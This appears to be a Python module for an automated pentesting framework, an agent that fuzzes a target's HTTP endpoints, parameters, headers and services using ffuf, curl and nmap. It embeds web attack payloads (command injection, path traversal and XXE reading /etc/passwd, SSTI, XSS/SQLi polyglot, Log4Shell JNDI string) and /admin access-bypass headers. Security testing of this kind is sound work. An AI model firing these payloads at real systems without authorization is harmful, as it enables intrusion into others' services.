"""META-06 FuzzingZeroDayAgent — coverage-based fuzzing, AI payload generation. Elite-only."""

from __future__ import annotations

import asyncio
import json
import shutil
from typing import Any

from ..base import AgentResult, BaseAgent
from ..context import AgentContext
from ..registry import register, _REGISTRY
from ...evidence.schema import Evidence, EvidenceType, Severity
from ...graph.hypothesis import Hypothesis


@register
class FuzzingZeroDayAgent(BaseAgent):
    agent_id = "fuzzing_zeroday"
    description = (
        "Elite-tier fuzzing: coverage-guided fuzzing, AI-assisted payload "
        "generation, protocol fuzzing, 0-day discovery"
    )

    # Fuzz categories and their tool mappings
    _FUZZ_TOOLS = {
        "http": {"binary": "ffuf", "alt": "wfuzz"},
        "protocol": {"binary": "boofuzz", "alt": "radamsa"},
        "binary": {"binary": "afl-fuzz", "alt": "honggfuzz"},
        "api": {"binary": "restler", "alt": "ffuf"},
    }

    # AI-assisted mutation seed patterns
    _MUTATION_SEEDS = [
        # Format string
        "%s%s%s%s%s%s%s%s%s%s%n%n%n%n",
        # Buffer overflow patterns
        "A" * 256, "A" * 1024, "A" * 4096,
        # Integer overflow
        "2147483647", "4294967295", "-2147483648",
        # Null byte injection
        "test\x00admin",
        # Unicode edge cases
        "\ufeff\ufeff\ufeff", "\ud800", "\U0001f4a9" * 100,
        # Path traversal
        "..%2f" * 10 + "etc/passwd",
        # Command injection
        "$(sleep 5)", "`sleep 5`", "|sleep 5",
        # SSTI
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        # XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ]

    async def run(self, context: AgentContext) -> AgentResult:
        target = context.mission.target
        findings: list[Evidence] = []
        hypotheses: list[Hypothesis] = []

        # Phase 1: HTTP endpoint fuzzing with ffuf
        http_findings = await self._fuzz_http_endpoints(target)
        findings.extend(http_findings)

        # Phase 2: Parameter fuzzing
        param_findings = await self._fuzz_parameters(target)
        findings.extend(param_findings)

        # Phase 3: Header fuzzing
        header_findings = await self._fuzz_headers(target)
        findings.extend(header_findings)

        # Phase 4: AI-assisted payload generation and testing
        ai_findings = await self._ai_payload_testing(target)
        findings.extend(ai_findings)

        # Phase 5: Protocol-level fuzzing assessment
        proto_findings = await self._protocol_fuzz_assessment(target)
        findings.extend(proto_findings)

        # Phase 6: Binary/memory corruption fuzzing assessment
        findings.append(Evidence(
            agent_id=self.agent_id,
            title=f"Binary fuzzing assessment for {target}",
            severity=Severity.INFO,
            evidence_type=EvidenceType.OTHER,
            description=(
                "Binary/coverage-guided fuzzing assessment:\n"
                "- AFL++/honggfuzz can be used for compiled service binaries\n"
                "- libFuzzer for library-level fuzzing\n"
                "- OSS-Fuzz integration for continuous fuzzing\n"
                "- Requires access to source code or binary instrumentation\n"
                "- Recommended: instrument all parsers, deserializers, and "
                "protocol handlers"
            ),
            tags=["fuzzing", "binary", "coverage-guided", "assessment"],
        ))

        # Generate chain hypotheses
        if any(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in findings):
            hypotheses.append(Hypothesis(
                title=f"Zero-day vulnerability in {target} input handling",
                rationale="Fuzzing revealed unexpected behavior in input processing",
                probability=0.4,
                impact=0.95,
                suggested_agent="fuzzing_zeroday",
            ))
        hypotheses.append(Hypothesis(
            title=f"Deserialization vulnerability via fuzzed payloads on {target}",
            rationale="Fuzzing may trigger unsafe deserialization paths",
            probability=0.5,
            impact=0.9,
            suggested_agent="deserialization",
        ))
        hypotheses.append(Hypothesis(
            title=f"Memory corruption in {target} backend services",
            rationale="Input mutation testing may reveal buffer handling issues",
            probability=0.3,
            impact=0.95,
            suggested_agent="fuzzing_zeroday",
        ))

        return AgentResult(
            agent_id=self.agent_id,
            findings=findings,
            hypotheses=hypotheses,
            status="completed",
            metadata={
                "fuzz_categories_tested": ["http", "parameter", "header", "ai_payload"],
                "elite_only": True,
            },
        )

    # ------------------------------------------------------------------
    # Tool helpers
    # ------------------------------------------------------------------

    async def _fuzz_http_endpoints(self, target: str) -> list[Evidence]:
        results: list[Evidence] = []
        ffuf = shutil.which("ffuf")
        if not ffuf:
            return results

        # Directory/endpoint discovery fuzzing
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        proc = await asyncio.create_subprocess_exec(
            ffuf, "-u", f"https://{target}/FUZZ",
            "-w", wordlist,
            "-mc", "200,201,301,302,403,405,500",
            "-fc", "404",
            "-t", "10",
            "-json",
            "-s",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=300)
        try:
            data = json.loads(stdout.decode())
            fuzz_results = data.get("results", [])
            # Flag 500 errors as potential crashes
            crashes = [r for r in fuzz_results if r.get("status") == 500]
            if crashes:
                results.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"Server crashes (HTTP 500) found during fuzzing of {target}",
                    severity=Severity.HIGH,
                    evidence_type=EvidenceType.EXPLOIT,
                    description=(
                        f"Fuzzing discovered {len(crashes)} endpoints returning "
                        "HTTP 500, indicating potential unhandled exceptions or crashes."
                    ),
                    response=json.dumps(crashes[:10], indent=2),
                    tags=["fuzzing", "crash", "http-500"],
                ))
            # Flag forbidden paths that suggest hidden functionality
            forbidden = [r for r in fuzz_results if r.get("status") == 403]
            if forbidden:
                results.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"Hidden endpoints (403) discovered on {target}",
                    severity=Severity.MEDIUM,
                    evidence_type=EvidenceType.NETWORK,
                    description=(
                        f"{len(forbidden)} endpoints return 403 Forbidden, "
                        "indicating access-controlled resources."
                    ),
                    response=json.dumps(
                        [r.get("input", {}).get("FUZZ", "") for r in forbidden[:20]],
                        indent=2,
                    ),
                    tags=["fuzzing", "hidden-endpoint", "403"],
                ))
        except json.JSONDecodeError:
            pass
        return results

    async def _fuzz_parameters(self, target: str) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("ffuf") and not shutil.which("wfuzz"):
            return results

        fuzz_binary = shutil.which("ffuf") or shutil.which("wfuzz")
        assert fuzz_binary is not None

        # Test common parameters with mutation payloads
        params = ["id", "q", "search", "page", "file", "path", "url", "name"]
        for param in params[:4]:
            for seed in self._MUTATION_SEEDS[:5]:
                proc = await asyncio.create_subprocess_exec(
                    "curl", "-s", "-o", "/dev/null",
                    "-w", "%{http_code}:%{time_total}",
                    "--max-time", "10",
                    f"https://{target}/?{param}={seed}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                response = stdout.decode().strip()
                parts = response.split(":")
                if len(parts) == 2:
                    code = parts[0]
                    elapsed = float(parts[1]) if parts[1] else 0
                    if code == "500":
                        results.append(Evidence(
                            agent_id=self.agent_id,
                            title=f"Crash via parameter {param} on {target}",
                            severity=Severity.HIGH,
                            evidence_type=EvidenceType.EXPLOIT,
                            description=(
                                f"Parameter '{param}' with mutation payload caused "
                                f"HTTP 500 response. Payload type: {seed[:30]}..."
                            ),
                            request=f"GET https://{target}/?{param}={seed[:100]}",
                            response=f"HTTP {code}",
                            tags=["fuzzing", "parameter", "crash"],
                        ))
                        break
                    elif elapsed > 5.0:
                        results.append(Evidence(
                            agent_id=self.agent_id,
                            title=f"Slow response via parameter {param} on {target}",
                            severity=Severity.MEDIUM,
                            evidence_type=EvidenceType.EXPLOIT,
                            description=(
                                f"Parameter '{param}' caused {elapsed:.1f}s response "
                                f"time (possible injection or DoS vector)."
                            ),
                            request=f"GET https://{target}/?{param}={seed[:100]}",
                            response=f"HTTP {code}, {elapsed:.1f}s",
                            tags=["fuzzing", "parameter", "slow-response"],
                        ))
                        break
        return results

    async def _fuzz_headers(self, target: str) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        fuzz_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "Content-Type": "application/xml",
            "Transfer-Encoding": "chunked, chunked",
            "Host": "localhost",
            "X-Custom-IP-Authorization": "127.0.0.1",
        }
        for header, value in fuzz_headers.items():
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-o", "/dev/null",
                "-w", "%{http_code}",
                "--max-time", "5",
                "-H", f"{header}: {value}",
                f"https://{target}/admin",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            code = stdout.decode().strip()
            if code in ("200", "301", "302"):
                results.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"Access bypass via {header} header on {target}",
                    severity=Severity.HIGH,
                    evidence_type=EvidenceType.EXPLOIT,
                    description=(
                        f"Header '{header}: {value}' changed response to HTTP {code} "
                        "on /admin, suggesting access control bypass."
                    ),
                    request=f"GET /admin with {header}: {value}",
                    response=f"HTTP {code}",
                    tags=["fuzzing", "header", "access-bypass"],
                ))
        return results

    async def _ai_payload_testing(self, target: str) -> list[Evidence]:
        """Generate and test AI-assisted mutation payloads."""
        results: list[Evidence] = []
        if not shutil.which("curl"):
            return results

        # AI-inspired payload mutations (combining techniques)
        ai_payloads = [
            # Polyglot XSS/SQLi
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
            # JSON injection in header
            '{"__proto__":{"admin":true}}',
            # CRLF injection
            "test%0d%0aX-Injected: true",
            # Log4Shell pattern
            "${jndi:ldap://127.0.0.1/test}",
        ]
        for payload in ai_payloads:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-o", "/dev/null",
                "-w", "%{http_code}",
                "--max-time", "5",
                "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", json.dumps({"input": payload}),
                f"https://{target}/api",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            code = stdout.decode().strip()
            if code == "500":
                results.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"AI-generated payload caused crash on {target}",
                    severity=Severity.HIGH,
                    evidence_type=EvidenceType.EXPLOIT,
                    description=(
                        f"AI-crafted mutation payload triggered HTTP 500. "
                        f"Payload category: polyglot/injection"
                    ),
                    request=f"POST /api with payload: {payload[:100]}",
                    response=f"HTTP {code}",
                    tags=["fuzzing", "ai-payload", "crash"],
                ))
        return results

    async def _protocol_fuzz_assessment(self, target: str) -> list[Evidence]:
        results: list[Evidence] = []
        if not shutil.which("nmap"):
            return results

        # Check for non-HTTP services that could be fuzzed
        proc = await asyncio.create_subprocess_exec(
            "nmap", "-Pn", "-sV", "--top-ports", "100",
            "--open", "-oG", "-", target,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=180)
        output = stdout.decode()
        fuzzable_services = [
            "ftp", "ssh", "smtp", "dns", "mysql", "postgresql",
            "redis", "mongodb", "mqtt", "amqp",
        ]
        found_services: list[str] = []
        for svc in fuzzable_services:
            if svc in output.lower():
                found_services.append(svc)

        if found_services:
            results.append(Evidence(
                agent_id=self.agent_id,
                title=f"Protocol fuzzing targets on {target}",
                severity=Severity.INFO,
                evidence_type=EvidenceType.NETWORK,
                description=(
                    f"Services amenable to protocol fuzzing: {', '.join(found_services)}. "
                    "Use boofuzz/radamsa for protocol-level mutation testing."
                ),
                response=json.dumps({"fuzzable_services": found_services}, indent=2),
                tags=["fuzzing", "protocol", "enumeration"],
            ))

        return results


# Backward compatibility alias for selector.py which uses "fuzzing_zerodday" (double d)
_REGISTRY["fuzzing_zerodday"] = FuzzingZeroDayAgent
